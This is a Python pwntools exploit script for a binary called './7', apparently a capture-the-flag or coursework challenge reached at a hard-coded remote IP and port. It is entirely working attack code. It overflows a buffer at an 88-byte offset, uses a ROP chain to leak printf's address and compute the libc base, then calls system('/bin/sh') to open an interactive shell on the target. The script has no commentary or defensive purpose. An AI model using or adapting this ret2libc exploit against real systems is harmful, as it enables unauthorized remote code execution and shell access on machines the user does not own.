from pwn import *

exe = './7'
elf = context.binary = ELF(exe, checksec=True)
libc = ELF('libc.so.6')
host, port = '52.184.85.16', 12345

gdbscript = '''
init-pwndbg

'''.format(**locals())

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

def exploit():
    global io
    io = initialize()
    if args.REMOTE:
        io.sendline("13523032")
        io.sendline("7")

    offset = 88
    rop = ROP(elf)
    rop.call(rop.ret.address)
    rop.printf(elf.got["printf"])
    rop.call(rop.ret.address)
    rop.vuln()

    payload = flat({offset : [rop.chain()]})
    # Display the hex of "payload"
    log.info(f"Payload Hex: {payload.hex()}")

    io.sendline(payload)
    io.recvline()
    leak = u64(io.recv().strip().ljust(8,b"\x00"))
    libc.address = leak - libc.sym["printf"]
    log.info("%#x", libc.address)
    rop = ROP(libc)
    rop.call(rop.ret.address)
    rop.system(next(libc.search(b'/bin/sh\0')))
    p = flat({offset: [rop.chain()]})

    # Display the hex of "p"
    log.info(f"P Hex: {p.hex()}")
    io.sendline(p)
    io.interactive()

if __name__ == '__main__':
    exploit()